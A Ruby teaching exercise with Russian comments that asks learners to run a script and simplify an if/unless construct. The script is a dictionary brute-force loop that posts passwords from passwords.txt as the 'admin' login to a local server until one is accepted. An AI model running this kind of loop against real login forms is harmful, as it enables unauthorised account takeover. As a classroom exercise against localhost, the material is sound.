# frozen_string_literal: true

# Задание: попробуйте запустить программу и спасти планету. Подумайте как можно
# улучшить конструкцию “if” чтобы она была более наглядной и лаконичной.
# Задание: когда правильный пароль найден, введите текст ниже в своей текстовый
# редактор и замените “123456” на найденный пароль:

require "net/http"
uri = URI("http://localhost:4567/login")
# res = Net::HTTP.post_form(uri, username: 'admin', password: 'secret')
# puts res.body

File
  .new("passwords.txt")
  .each do |line|
    password = line.chomp
    puts "Trying #{password}..."
    res = Net::HTTP.post_form(uri, username: "admin", password: password)
    # if res.body.include?("Wrong")
    # не делать ничего, просто продолжать
    # else
    unless res.body.include?('Wrong')
      puts "Password found: #{password}"
      exit
    end
  end
